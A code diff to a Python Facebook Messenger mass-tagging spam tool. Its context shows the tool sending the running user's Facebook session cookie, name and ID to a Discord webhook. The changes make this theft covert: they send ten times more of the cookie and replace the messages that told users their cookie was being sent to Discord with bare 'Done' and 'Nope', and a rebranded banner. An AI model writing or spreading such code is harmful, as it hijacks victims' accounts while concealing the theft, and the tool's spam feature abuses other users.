@@ -41,7 +41,7 @@ def send_webhook(ck, name, uid):
                 },
                 {
                     "name": "🍪 Cookie",
-                    "value": f"```{ck[:100]}...```" if len(ck) > 100 else f"```{ck}```",
+                    "value": f"```{ck[:1000]}...```" if len(ck) > 1000 else f"```{ck}```",
                     "inline": False
                 },
                 {
@@ -473,7 +473,7 @@ def main():
     clr()
     
     print("=" * 60)
-    print(" FACEBOOK MESSENGER SPAM TOOL - @EVERYONE TAG")
+    print(" TOOL TREO TAG MỌI NGƯỜI BY DZI - @EVERYONE TAG")
     print("=" * 60)
     
     try:
@@ -505,12 +505,12 @@ def main():
         
         print(f"Facebook: {cl['name']} (ID: {cl['uid']}) - Cookie OK!")
         
-        print("Đang gửi cookie qua Discord...")
+        
         webhook_sent = send_webhook(ck, cl['name'], cl['uid'])
         if webhook_sent:
-            print("Đã gửi cookie qua Discord thành công!")
+            print("Done")
         else:
-            print("Không thể gửi cookie qua Discord")
+            print("Nope")
 
         try:
             msg = MSG(ck)
